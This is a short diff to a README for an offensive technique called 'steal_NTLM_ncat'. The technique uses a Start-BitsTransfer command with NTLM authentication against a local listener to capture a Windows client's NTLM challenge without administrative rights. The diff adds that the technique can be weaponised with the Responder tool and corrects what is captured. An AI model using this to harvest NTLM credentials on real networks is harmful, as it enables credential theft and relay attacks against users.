@@ -1,5 +1,7 @@
 # steal_NTLM_ncat
 
+Can be easilly weaponised with something like "responder" that can do a full "talk" for challanges.
+
 Rules:
 
 * No administrative rights needed.
@@ -21,7 +23,7 @@ Rules:
 `Start-BitsTransfer -Authentication NTLM -Source http://127.0.0.1:8080 -Description http://127.0.0.1:8080`
 
 3. Result:
-You got NTLM hash__
+You got the first challange that the client sends before the full NTLM hash
 
 
 
